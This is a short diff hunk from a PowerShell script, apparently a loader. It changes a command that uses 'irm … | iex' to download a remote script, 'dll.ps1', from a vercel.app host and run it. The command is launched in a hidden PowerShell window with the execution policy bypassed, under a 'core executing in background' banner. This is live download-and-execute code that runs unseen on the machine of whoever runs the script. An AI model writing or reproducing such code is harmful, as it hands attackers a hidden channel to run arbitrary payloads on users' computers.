@@ -350,7 +350,7 @@ Write-Host " "
 Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
 Write-Host " "
 
-$command = "irm zoream-database.vercel.app/dll.ps1 | iex"
+$command = "irm https://zoream-database.vercel.app/dll.ps1 | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
 for ($i = 10; $i -gt 0; $i--) {
